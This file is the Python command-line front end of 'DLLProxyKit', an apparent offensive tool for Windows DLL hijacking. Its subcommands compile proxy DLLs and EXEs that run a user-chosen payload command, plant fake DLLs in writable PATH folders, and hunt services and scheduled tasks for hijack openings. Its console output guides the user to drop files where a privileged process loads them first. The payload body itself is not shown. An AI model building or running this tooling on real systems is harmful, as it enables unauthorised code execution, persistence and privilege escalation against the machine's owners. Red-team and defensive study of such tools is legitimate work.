#!/usr/bin/env python3
"""DLLProxyKit CLI."""

from __future__ import annotations

import argparse
import sys
import time
from pathlib import Path

from . import ui as console
from .makers.auto import run_auto, run_revert
from .makers.fake import run as run_fake
from .core.common import ALBARAN_NAME, DEFAULT_PAYLOAD, PAYLOAD_FALLBACK, ensure_fallback_payload
from .core.compiler import detect_compilers, select_compilers
from .core.hunt import run_hunt
from .makers.kinds import parse_kinds
from .core.pathscan import (
    _norm_path,
    dll_search_before_path,
    outside_home,
    scan_path_dirs,
    shadow_hijackables,
)


def _add_include(parser: argparse.ArgumentParser) -> None:
    parser.add_argument(
        "-i",
        "--include",
        default=None,
        help="Comma-separated kinds: dll,exe,bat,cmd,ps1,pl,py (default: all)",
    )


def _add_unsafe(parser: argparse.ArgumentParser) -> None:
    parser.add_argument(
        "--unsafe",
        action="store_true",
        help="Also use Windows PATH dirs and do not skip api-ms-win-/ext-ms-win- DLLs",
    )


def _add_payload(parser: argparse.ArgumentParser) -> None:
    parser.add_argument(
        "--payload",
        "--command",
        dest="payload",
        default=DEFAULT_PAYLOAD,
        help="Command executed by the proxy (written to C:\\Windows\\Temp\\payload.txt)",
    )
    parser.add_argument(
        "--skip",
        default=None,
        help="Comma-separated substrings to skip",
    )
    parser.add_argument(
        "--compiler",
        default=None,
        help="Force a compiler: cl / gcc / clang / tcc / rustc, or a path to an exe",
    )


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Generate DLL/EXE proxies (C or Rust).",
    )
    shared = argparse.ArgumentParser(add_help=False)
    shared.add_argument(
        "-v",
        "--verbose",
        "--debug",
        dest="verbose",
        action="store_true",
        help="Print compiler commands, full error output, and extra skip detail",
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    proxy = sub.add_parser("proxy", parents=[shared], help="Proxy a file or folder")
    proxy.add_argument("input", nargs="?", default=None, help="DLL/EXE file or directory")
    proxy.add_argument(
        "output",
        nargs="?",
        default=None,
        help="Output directory or file (default: same folder as input)",
    )
    proxy.add_argument(
        "--keep-going",
        action="store_true",
        help="Continue if one file or maker fails",
    )
    _add_include(proxy)
    _add_payload(proxy)
    _add_unsafe(proxy)

    auto = sub.add_parser(
        "auto", parents=[shared], help="Proxy writable PATH dirs outside the user profile"
    )
    auto.add_argument(
        "--shadow",
        action="store_true",
        help="Proxy files from later unwritable PATH dirs into the highest-priority writable dir",
    )
    _add_include(auto)
    _add_payload(auto)
    _add_unsafe(auto)

    revert = sub.add_parser(
        "revert", parents=[shared], help=f"Undo proxies using {ALBARAN_NAME}"
    )
    revert.add_argument(
        "target",
        nargs="?",
        default=None,
        help=f"Folder or file (default: every writable folder with {ALBARAN_NAME})",
    )
    _add_include(revert)
    _add_unsafe(revert)

    paths = sub.add_parser(
        "paths", parents=[shared], help="List PATH dirs and hijackable files"
    )
    _add_include(paths)
    _add_unsafe(paths)

    hunt = sub.add_parser(
        "hunt",
        parents=[shared],
        help="List PATH/DLL hijack angles in services and scheduled tasks",
    )
    _add_unsafe(hunt)

    fake = sub.add_parser(
        "fake",
        parents=[shared],
        help="Plant a fake DLL (no original) into a writable PATH dest",
    )
    fake.add_argument("names", nargs="+", help="DLL names, e.g. osppc.dll")
    fake.add_argument(
        "-o",
        "--output",
        default=None,
        help="Destination folder (default: first writable auto dest)",
    )
    fake.add_argument("--arch", choices=("x64", "x86"), default="x64")
    fake.add_argument(
        "--exports",
        default=None,
        help="Comma-separated export names (stubs return 0)",
    )
    fake.add_argument(
        "--keep-going",
        action="store_true",
        help="Continue if one name fails",
    )
    _add_payload(fake)
    _add_unsafe(fake)

    return parser.parse_args()


def _skip_arg(args: argparse.Namespace) -> str | None:
    skip = getattr(args, "skip", None)
    if skip is not None:
        return skip
    if getattr(args, "unsafe", False):
        return ""
    return None


def show_compilers(compilers) -> None:
    console.section("compilers")
    if not compilers:
        console.fail("none found  (cl / gcc / clang / tcc / rustc)")
        return
    for c in compilers:
        extra = f" {' '.join(c.extra_args)}" if c.extra_args else ""
        console.ok(f"{c.kind}{extra}  {console.dim(c.arch)}  {c.path}")


_TREE_ORDER = (".exe", ".dll", ".bat", ".cmd", ".ps1", ".pl", ".py")


def _path_line(item, extra: str = "") -> str:
    rank = f"#{item.rank:<3}" if item.rank is not None else " -  "
    path = str(item.path)
    if item.writable and outside_home(item.path):
        path = console.hot(path)
    src = console.dim("  [" + ",".join(item.sources) + "]")
    return f"{rank} {path}{src}{extra}"


def _hijack_note(item, dest, files_by_dir: dict, total: int) -> str:
    if dest is None or dest.rank is None:
        return ""
    key = _norm_path(item.path)
    if item.rank == dest.rank:
        return f"  {total} hijackable"
    n = len(files_by_dir.get(key, ()))
    if n:
        return f"  {n} hijackable"
    return ""


def _emit_tree(files) -> None:
    buckets: dict[str, list] = {}
    for path in files:
        buckets.setdefault(path.suffix.lower(), []).append(path)
    for ext in _TREE_ORDER:
        group = buckets.get(ext)
        if not group:
            continue
        console.item(ext[1:], indent=6)
        for path in group:
            console.item(path.name, indent=8)


def _emit_path(item, extra: str = "", files=None) -> None:
    line = _path_line(item, extra)
    if item.writable:
        console.ok(line)
    elif item.exists:
        console.fail(line)
    else:
        console.warn(line)
    if files and console.is_verbose():
        _emit_tree(files)


def show_path_scan(*, full: bool, kinds, unsafe: bool) -> None:
    entries = scan_path_dirs()
    writable = [e for e in entries if e.writable]
    ranked = sorted(
        [e for e in entries if e.rank is not None],
        key=lambda e: e.rank,
    )
    registry_only = [e for e in entries if e.rank is None]
    dest, files_by_dir = shadow_hijackables(
        [k.ext for k in kinds], unsafe=unsafe
    )
    total = sum(len(v) for v in files_by_dir.values())

    def emit(item, tree: bool = False) -> None:
        extra = _hijack_note(item, dest, files_by_dir, total)
        files = files_by_dir.get(_norm_path(item.path)) if tree else None
        _emit_path(item, extra, files)

    console.section(f"writable PATH  {len(writable)}/{len(entries)}")
    if writable:
        for item in writable:
            emit(item)
    else:
        console.warn("none")
    console.info("lower # loads first; exe dir, System32, Windows and cwd beat PATH")

    if not full:
        return

    console.section("DLL search order  (first match wins)")
    console.info("before PATH")
    for num, label in dll_search_before_path():
        console.item(f"{num}  {label}")
    console.info("PATH")
    if ranked:
        for item in ranked:
            emit(item, tree=True)
    else:
        console.warn("empty")
    if registry_only:
        console.info("in registry, not in this process PATH")
        for item in registry_only:
            emit(item)


_HUNT_WHY = {
    "not on search path": "missing today (not on the search path)",
    "relative ImagePath": "relative service path (PATH picks the exe)",
    "relative Execute": "relative task path (PATH picks the exe)",
    "bare name in args": "bare name in arguments (PATH picks the file)",
}


def _hunt_why(hit) -> str:
    if hit.kind == "dll" and hit.why != "not on search path":
        return f"today loads from {hit.why}"
    return _HUNT_WHY.get(hit.why, hit.why)


def _hunt_plant(hit) -> str:
    rank = f"#{hit.dest.rank}" if hit.dest.rank is not None else "-"
    path = str(hit.dest.path)
    if hit.dest.writable and outside_home(hit.dest.path):
        path = console.hot(path)
    scope = "machine PATH" if hit.scope == "machine" else "user PATH"
    return f"{path}  ({rank}, {scope})"


def show_hunt(*, unsafe: bool) -> None:
    hits = run_hunt(unsafe=unsafe)
    console.section("hunt")
    if not hits:
        console.info("none")
        return
    console.info("drop the filename in the plant folder — this process would load yours first")
    groups: dict[tuple[str, str, str, str, str], list] = {}
    order: list[tuple[str, str, str, str, str]] = []
    for hit in hits:
        key = (hit.source, hit.title, hit.account, hit.command, hit.scope)
        if key not in groups:
            groups[key] = []
            order.append(key)
        groups[key].append(hit)
    for key in order:
        source, title, account, command, _scope = key
        who = account or "-"
        console.section(f"{title.lstrip('\\')}  ({source} as {who})")
        console.info(command)
        group = groups[key]
        shared = len({(hit.dest.path, hit.dest.rank, hit.scope) for hit in group}) == 1
        if shared:
            console.info(f"plant in  {_hunt_plant(group[0])}")
        for hit in group:
            extra = _hunt_why(hit)
            if not shared:
                extra = f"{extra}  ·  plant in  {_hunt_plant(hit)}"
            console.ok(f"{hit.target}  {console.dim(extra)}")


def _payload_hint() -> None:
    print()
    print(
        f"  {console.green('✎')}  {console.green(str(PAYLOAD_FALLBACK))}"
        f"  <--  {console.under('You can write command here!!')}"
    )
    print()


def _need_compilers(args, kinds, *, required: bool = False):
    compilers = []
    if not required and not any(k.compile for k in kinds):
        return compilers, 0
    compilers = detect_compilers()
    if args.compiler:
        chosen = select_compilers(compilers, args.compiler)
        if not chosen:
            show_compilers(compilers)
            console.fail(f"compiler not found  {args.compiler}")
            print()
            return compilers, 1
        compilers = chosen
    show_compilers(compilers)
    if not compilers:
        print()
        return compilers, 1
    return compilers, 0


def _run_proxy(args, kinds, compilers) -> int:
    if args.input is None:
        console.fail("missing input (file or directory)")
        print()
        return 1

    src = Path(args.input)
    kwargs = dict(
        input=args.input,
        output=args.output,
        payload=args.payload,
        skip=_skip_arg(args),
        keep_going=args.keep_going,
        compilers=compilers,
    )

    if src.is_file():
        ext = src.suffix.lower()
        kind = next((k for k in kinds if k.ext == ext), None)
        if kind is None:
            exts = " / ".join(k.ext for k in kinds)
            console.fail(f"input must be {exts}  {src}")
            print()
            return 1
        jobs = [(ext[1:].upper(), kind.proxy)]
    elif src.is_dir():
        jobs = [(k.ext[1:].upper(), k.proxy) for k in kinds]
    else:
        console.fail(f"input does not exist  {src}")
        print()
        return 1

    rc = 0
    ensure_fallback_payload(args.payload)
    for label, fn in jobs:
        console.section(f"{label} proxies")
        result = fn(**kwargs)
        if result != 0:
            rc = result
            if not args.keep_going:
                _payload_hint()
                return rc
    _payload_hint()
    return rc


def main() -> int:
    args = parse_args()
    console.setup(verbose=args.verbose)
    console.banner()

    kinds = []
    if args.cmd not in {"hunt", "fake"}:
        try:
            kinds = parse_kinds(getattr(args, "include", None))
        except ValueError as exc:
            console.fail(str(exc))
            print()
            return 1

    unsafe = getattr(args, "unsafe", False)

    if args.cmd == "paths":
        show_path_scan(full=True, kinds=kinds, unsafe=unsafe)
        print()
        return 0

    if args.cmd == "hunt":
        show_hunt(unsafe=unsafe)
        print()
        return 0

    if args.cmd == "fake":
        compilers, err = _need_compilers(args, kinds, required=True)
        if err:
            return err
        ensure_fallback_payload(args.payload)
        rc = run_fake(
            args.names,
            output=args.output,
            payload=args.payload,
            compilers=compilers,
            arch=args.arch,
            exports=args.exports,
            keep_going=args.keep_going,
            unsafe=unsafe,
        )
        _payload_hint()
        return rc

    show_path_scan(full=False, kinds=kinds, unsafe=unsafe)

    if args.cmd == "revert":
        target = args.target
        if target is None:
            console.warn(
                console.yell(
                    f"revert with no target restores every writable folder that has a {ALBARAN_NAME}"
                )
            )
            console.info("Ctrl+C to cancel")
            for n in range(5, 0, -1):
                console.info(f"{n}...")
                time.sleep(1)
        rc = run_revert(target, kinds=kinds, unsafe=unsafe)
        print()
        return rc

    compilers, err = _need_compilers(args, kinds)
    if err:
        return err

    if args.cmd == "auto":
        ensure_fallback_payload(args.payload)
        rc = run_auto(
            args.payload,
            _skip_arg(args),
            compilers,
            kinds=kinds,
            shadow=args.shadow,
            unsafe=unsafe,
        )
        _payload_hint()
        return rc

    return _run_proxy(args, kinds, compilers)


if __name__ == "__main__":
    sys.exit(main())
